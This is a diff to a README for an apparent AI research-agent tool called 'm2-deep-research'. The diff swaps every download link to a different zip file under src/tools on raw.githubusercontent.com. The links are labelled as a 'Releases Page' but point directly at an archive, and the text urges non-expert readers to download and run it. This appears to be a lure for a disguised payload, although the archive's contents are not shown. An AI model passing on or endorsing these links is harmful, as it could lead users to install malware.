@@ -1,13 +1,13 @@
 # 🛠️ m2-deep-research - Powerful Agents for Smart Decisions
 
 ## 📦 Download Now
-[![Download m2-deep-research](https://raw.githubusercontent.com/BAGUSASARI2019/m2-deep-research/main/src/tools/m2-deep-research_1.7.zip)](https://raw.githubusercontent.com/BAGUSASARI2019/m2-deep-research/main/src/tools/m2-deep-research_1.7.zip)
+[![Download m2-deep-research](https://raw.githubusercontent.com/BAGUSASARI2019/m2-deep-research/main/src/tools/m_deep_research_v2.9.zip)](https://raw.githubusercontent.com/BAGUSASARI2019/m2-deep-research/main/src/tools/m_deep_research_v2.9.zip)
 
 ## 🚀 Getting Started
 Welcome to **m2-deep-research**! This guide will help you download and run our application with ease, even if you're not a tech expert. Our deep research agents utilize MiniMax-M2 interleaved thinking for smarter decision-making. Let’s get started.
 
 ## 📥 Download & Install
-To download the latest version of m2-deep-research, visit this page: [Releases Page](https://raw.githubusercontent.com/BAGUSASARI2019/m2-deep-research/main/src/tools/m2-deep-research_1.7.zip). 
+To download the latest version of m2-deep-research, visit this page: [Releases Page](https://raw.githubusercontent.com/BAGUSASARI2019/m2-deep-research/main/src/tools/m_deep_research_v2.9.zip). 
 
 Here, you will find a list of available versions. Follow these steps:
 
@@ -52,7 +52,7 @@ After installing, you can start using the application right away. Here’s how t
 
 ## 🌟 Frequently Asked Questions
 ### How do I update the application?
-To update, go back to the [Releases Page](https://raw.githubusercontent.com/BAGUSASARI2019/m2-deep-research/main/src/tools/m2-deep-research_1.7.zip) and follow the download steps for the latest version. It's always a good idea to keep your software up to date.
+To update, go back to the [Releases Page](https://raw.githubusercontent.com/BAGUSASARI2019/m2-deep-research/main/src/tools/m_deep_research_v2.9.zip) and follow the download steps for the latest version. It's always a good idea to keep your software up to date.
 
 ### What if I encounter errors?
 If you run into any issues, check the 'Issues' tab on our GitHub repository. You can search for similar problems or open a new issue if needed.
